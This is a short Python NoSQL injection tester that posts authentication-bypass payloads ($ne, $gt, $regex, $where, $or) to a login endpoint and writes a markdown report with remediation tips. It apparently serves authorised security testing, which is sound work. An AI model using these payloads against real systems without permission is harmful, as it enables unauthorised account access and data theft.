#!/usr/bin/env python3
"""
NoSQL Injection Tester
Tests for NoSQL injection vulnerabilities (MongoDB, etc.).
"""

import sys
import requests
import json
from typing import List

class NoSQLInjectionTester:
    def __init__(self, url: str):
        self.url = url
        self.payloads = [
            {'$ne': None},
            {'$gt': ''},
            {'$regex': '.*'},
            {'$where': '1==1'},
            {'$or': [{'username': 'admin'}, {'username': 'admin'}]},
            {'username': {'$ne': None}},
            {'password': {'$regex': '.*'}},
            {'$where': 'this.username == this.password'}
        ]
        self.vulnerable = False
    
    def test_nosql_injection(self, param: str, value: str = 'test') -> bool:
        """Test for NoSQL injection"""
        print(f"[*] Testing NoSQL injection in parameter: {param}")
        
        for payload in self.payloads:
            try:
                # Test as JSON
                data = {param: payload}
                response = requests.post(
                    self.url,
                    json=data,
                    timeout=10
                )
                
                # Check for successful authentication bypass
                if response.status_code == 200 and 'success' in response.text.lower():
                    print(f"[+] Potential NoSQL injection found!")
                    self.vulnerable = True
                    return True
                
                # Test as form data (URL encoded)
                response = requests.post(
                    self.url,
                    data={param: json.dumps(payload)},
                    timeout=10
                )
                
                if response.status_code == 200 and 'success' in response.text.lower():
                    print(f"[+] Potential NoSQL injection found!")
                    self.vulnerable = True
                    return True
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return False
    
    def generate_report(self) -> str:
        """Generate NoSQL injection test report"""
        report = f"# NoSQL Injection Test Report for {self.url}\n\n"
        
        if self.vulnerable:
            report += "⚠️ **VULNERABLE**: NoSQL injection vulnerability detected!\n\n"
        else:
            report += "✅ No NoSQL injection vulnerability detected.\n\n"
        
        report += "## Tested Payloads\n\n"
        for i, payload in enumerate(self.payloads, 1):
            report += f"### Payload {i}\n\n"
            report += "```json\n"
            report += json.dumps(payload, indent=2)
            report += "\n```\n\n"
        
        report += "## Common NoSQL Injection Operators\n\n"
        report += "- `$ne`: Not equal\n"
        report += "- `$gt`: Greater than\n"
        report += "- `$regex`: Regular expression\n"
        report += "- `$where`: JavaScript expression\n"
        report += "- `$or`: Logical OR\n\n"
        
        report += "## Recommendations\n\n"
        report += "1. Use parameterized queries\n"
        report += "2. Validate and sanitize all input\n"
        report += "3. Use MongoDB's built-in security features\n"
        report += "4. Implement proper authentication\n"
        report += "5. Use least privilege principle\n\n"
        
        return report

def main():
    if len(sys.argv) < 3:
        print("Usage: python nosql_injection.py <url> <parameter>")
        print("Example: python nosql_injection.py http://example.com/login username")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    
    tester = NoSQLInjectionTester(url)
    tester.test_nosql_injection(param)
    
    report = tester.generate_report()
    
    filename = "nosql_injection_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"[+] NoSQL injection testing complete")
    print(f"[+] Report saved to {filename}")
    print(f"[!] WARNING: Only test applications you own or have permission to test!")

if __name__ == '__main__':
    main()

